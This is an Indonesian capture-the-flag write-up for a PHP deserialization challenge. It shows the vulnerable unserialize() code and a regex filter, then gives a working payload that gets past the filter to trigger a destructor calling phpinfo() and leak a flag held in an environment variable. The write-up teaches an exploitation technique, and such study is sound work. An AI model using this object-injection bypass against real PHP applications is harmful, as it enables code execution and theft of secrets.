# Wake Up Call

Challenge ini memberi source PHP langsung dari halaman utama. Bagian pentingnya ada di parameter `ser`:

```php
$serialized = $_GET['ser'];

if (CheckSerializedData($serialized)) {
  @unserialize($serialized);
}
```

Filter `CheckSerializedData()` mencoba menolak token serialisasi berbahaya:

```php
function CheckSerializedData($str) {
    if (preg_match('/(?:O:|C:|s:|a:)/', preg_replace('/"[^"]*"/', '', $str))) return false;
    return true;
}
```

Masalahnya, filter ini hanya regex sederhana. Ia menghapus isi di antara tanda kutip dulu, lalu mencari token `O:`, `C:`, `s:`, dan `a:`. Karena parsing regex ini tidak memahami format serialized PHP secara utuh, kita bisa membuat tanda kutip yang membuat bagian berbahaya terlihat seperti berada di dalam string bagi regex, tetapi tetap diparse berbeda oleh `unserialize()`.

Payload yang dipakai:

```text
o:1:"i:0;O:8:"Bhackaro":1:{s:6:"action";s:7:"phpinfo";}}
```

Penjelasannya:

- `o:1:"i:0;...` memakai format object lama PHP untuk membuat container `stdClass` dengan satu property.
- Setelah filter menghapus string bertanda kutip, token `O:` dan `s:` di tengah payload tidak lagi terlihat sebagai token yang dilarang.
- Saat diproses oleh `unserialize()`, bagian `O:8:"Bhackaro"...` tetap dibuat sebagai object `Bhackaro`.
- Property publik `action` diisi dengan string `phpinfo`.
- Ketika object `Bhackaro` dihancurkan, method `__destruct()` menjalankan `($this->action)()`, sehingga `phpinfo()` terpanggil.

`phpinfo()` menampilkan environment variable proses Apache/PHP. Karena flag disimpan di environment `FLAG`, flag bisa diekstrak dari output HTML.

Cara menjalankan solver:

```bash
source /home/nata/ctf_env/bin/activate
python3 solver.py
```

Output:

```text
bhackariCTF{c0ngr4tz_f0r_unl0ck1ng_th3_fl4g_st0r3!_f8ea7eb2485c0bbca52d50e7dedf18ff88510bac615b66e309205e6989c01ad2}
```
